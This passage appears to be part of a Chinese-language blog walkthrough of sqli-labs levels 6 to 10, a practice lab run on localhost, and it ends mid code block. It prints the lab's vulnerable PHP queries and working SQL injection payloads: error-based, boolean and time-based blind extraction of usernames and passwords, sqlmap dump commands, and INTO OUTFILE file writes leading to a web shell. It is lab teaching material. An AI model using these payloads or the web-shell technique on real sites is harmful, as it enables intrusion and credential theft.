+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;  <span class="operator">/</span><span class="operator">/</span> 参数 $id 直接拼接进<span class="keyword">SQL</span>语句</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>) &#123;</span><br><span class="line">    echo <span class="string">&#x27;You are in...........&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span> 查询成功时显示</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    print_r(mysql_error());  <span class="operator">/</span><span class="operator">/</span> 查询失败时显示数据库错误信息</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p><strong>报错注入（双引号）</strong></p>
+<p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>字符型报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="图片"></p>
+<p>注入过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,database()),3) --+</span><br><span class="line">?id=1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">3</span>)<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),3)--+</span><br><span class="line">?id=1&quot; <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">3</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">文件读写注入$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)&#123;</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h2 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h2><p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="图片"></p>
+<p>可以确定不是数字型注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>报错了，但没有显示闭合方式，只能靠自己猜，唯一可以确定的就是<strong>闭合方式的最内层是单引号</strong>，加入—+注释后，还是不对，可以确定多个字符闭合，最里层的字符是单引号，没有好办法，只能一个一个尝试常见的闭合方式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>] <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>)] <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>尝试到<code>?id=1&#39;)) --+</code>不再报错，证明闭合方式是<code>&#39;))</code></p>
+<p>因为本题是文件读写注入，我们再学习一下<code>into outflie</code>命令：INTO OUTFILE 命令是用于将查询结果写入到一个文件中的 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MySQL&amp;spm=1001.2101.3001.7020">MySQL</a> 查询语句。它可以将查询结果保存为文本文件，供进一步处理或导出使用。</p>
+<p>语法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;filename&#x27;</span></span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>
+<p>既然我们要把查询的结果写入mysql中有写入权限的目录，我们首先需要获取到目录：我们也只能在前几个关卡中得到路径，以less-1为例，注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,@@basedir,@@datadir --+</span></span><br></pre></td></tr></table></figure>
+<p><code>@@basedir</code> 是MySQL的系统变量，表示 <strong>MySQL的安装目录</strong></p>
+<p><code>@@datadir</code> 是MySQL的系统变量，表示 <strong>数据库的存储路径</strong></p>
+<p><img src="8.png" alt="图片"></p>
+<p>不过我们需要保证mysql具有写入权限，这个有一个关键参数<strong>secure_file_priv</strong>，我们向<code>phpstudy_pro\Extensions\MySQL5.7.26\my.ini</code>写入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv <span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>show variables like &#39;%secure%&#39;;</code>查看该参数是否为空，不是null即可</p>
+<p><img src="9.png" alt="图片"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) order by 3 --+</span></span><br></pre></td></tr></table></figure>
+<p>找到列数后我们向里面写入文件，利用刚才获取到的目录，写入的语法是：<code>?id=-1&#39;)) union select sql语句 into outfile &#39;路径&#39; --+</code></p>
+<p>查表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test.txt&quot; --+   //目录要使用反双斜杠</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>)) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="keyword">into</span> outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test2.txt&quot; <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>查看写入test2.txt的内容：</p>
+<p><img src="10.png" alt="图片"></p>
+<p>查列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test3.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="11.png" alt="图片"></p>
+<p>查具体字段内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test4.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="12.png" alt="图片"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>不过上面的方式比较麻烦，那我们干脆写入一个一句话木马文件，通过蚁剑getshell：一般测试是不能写入后门文件的，我们这里先写一个phpinfo()测试下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\php_info.php&quot; --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="图片"></p>
+<p>成功后我们写入木马文件：</p>
+<p><img src="14.png" alt="图片"></p>
+<p>即使显示报错，但在我们文件夹里发现已经被写入：</p>
+<p><img src="15.png" alt="图片"></p>
+<p>最后就是使用一键getshell：</p>
+<p><img src="16.png" alt="图片"></p>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)&#123;</span><br><span class="line">  echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());  <span class="operator">/</span><span class="operator">/</span>因为这里被注释掉了，所以不会回显报错的内容，这就是与报错注入的区别</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>判断注入类型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>都没有报错，确定还是字符型</p>
+<p>测试<code>?id=1&#39;</code>，有报错，证明闭合方式最内层是<code>单引号</code>，加入<code>--+</code>测试，不再报错，证明闭合方式<code>只有单引号</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure>
+<p>查找出三列，但当我们查询数据库，发现不回显，尝试报错注入失败，但我们可以用上面的文件读写注入，这个是可以的</p>
+<p>但我们还可以用一种新方法：<strong>布尔盲注</strong></p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>介绍四个函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)        # 返回字符串的ASCII码</span><br><span class="line">length(str)        # 返回字符串的长度</span><br><span class="line">mid(str,index,j)        # 返回str的从index开始后的j位（index是从<span class="number">1</span>开始的）</span><br><span class="line">substr(str,index,j)        # 和mid功能一样</span><br></pre></td></tr></table></figure>
+<p>这里的注入语句还是用and进行拼接，可以根据判断结果推测and后的语句是否正确</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#判断依据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+ #正确回显</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ #无回显</span></span><br></pre></td></tr></table></figure>
+<p>下面开始判断：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+   #确定数据库长度是8</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="comment">--+   #确定数据库第一位是s</span></span><br></pre></td></tr></table></figure>
+<p>不过这样一位一位判断比较麻烦，我们使用sqlmap一把梭即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost:<span class="number">82</span>/Less-<span class="number">8</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; --batch</span></span><br></pre></td></tr></table></figure>
+<p><img src="17.png" alt="图片"></p>
+<p>存在布尔盲注和时间盲注</p>
+<p>继续跑数据库名，表名和字段名，和字段内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --dbs #查询数据库</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --current-db #查询当前数据库</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D &quot;security&quot; --tables #查询表</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D &quot;security&quot; -T &quot;users&quot; --columns #查询字段</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump #输出字段的具体内容</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)&#123;</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>; #输对只输出you <span class="keyword">are</span> <span class="keyword">in</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;  #输错无回显</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>这里使用?id=1 and 1=1 和?id=1 and 1=1都回显，判断是字符型，但后面奇怪的是，不管尝试下面哪个闭合字符：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">id=1&quot;</span></span><br><span class="line"><span class="string">id=1)</span></span><br><span class="line"><span class="string">id=1]</span></span><br></pre></td></tr></table></figure>
+<p>都回显了，按道理来讲，至少应该有一种要么不回显，要么报错的，这里猜测不管我们输入的对不对，回显的结果都是you are in</p>
+<p>面对这里注入，以上的注入方法都无效，我们只能使用<strong>时间盲注</strong></p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>用到的函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(条件,a,b)    # 当条件为真返回a，否则返回b</span><br><span class="line">if(<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)    # 进程睡眠<span class="number">5</span>秒</span><br></pre></td></tr></table></figure>
+<p>注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>这里直接回显了，并没有延迟，说明是字符型；接下来困难的是判断类型，只能一种一种的尝试，哪种延迟了五秒，证明是哪种闭合；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>第一次尝试单引号，延迟了五秒，闭合方式即<strong>单引号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),1)--+  #数据库长度为8</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+   #数据库名第一个字母是s</span></span><br></pre></td></tr></table></figure>
+<p>因为一个一个字符判断起来很麻烦，我们通常用sqlmap跑</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch</span></span><br></pre></td></tr></table></figure>
+<p><img src="18.png" alt="图片"></p>
+<h2 id="时间盲注？布尔盲注？"><a href="#时间盲注？布尔盲注？" class="headerlink" title="时间盲注？布尔盲注？"></a>时间盲注？布尔盲注？</h2><p>奇怪的是竟然还可以使用布尔盲注，有点乱。。。大概是使用<code>?id=1&#39; sleep(5)--+</code>这样基于时间延迟的布尔注入？？？</p>
+<p>但时间盲注也是基于时间延迟的，不过唯一可以确定的就是，<strong>可以使用布尔盲注的就一定可以使用时间盲注，反之不然</strong>，而且<strong>时间盲注基于页面的回显内容一直不变，而布尔盲注页面至少还会变化，根据变化从而判断</strong></p>
+<p>不管这么多，用sqlmap跑一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --technique T --current-db</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --technique T -D &quot;security&quot; --tables</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --technique T -D &quot;security&quot; -T &quot;users&quot; --columns</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --technique T -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump</span></span><br></pre></td></tr></table></figure>
+<p>以上是指定时间盲注，速度很慢，清除缓存后，指定布尔盲注，相对快了很多，不过不太懂本关是如何使用布尔注入的</p>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)&#123;</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;  #正确回显</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;  #错误回显</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>这一关没有什么新颖的，就是闭合方式换成了<strong>双引号</strong>，测试延迟</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and if(1,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p>延迟五秒，确定了闭合方式双引号，只要多尝试几次闭合方式，就能试出来，后面就是用sqlmap跑，和上一关几乎一模一样</p>
+<p>不过这里需要加上<code>level</code>，不设参数跑不出来：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --level 3</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --level 3 --current-db</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --level 3 -D &quot;security&quot; --tables</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --level 3 -D &quot;security&quot; -T &quot;users&quot; --columns</span></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">82</span><span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --level 3 -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)&#123;</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;  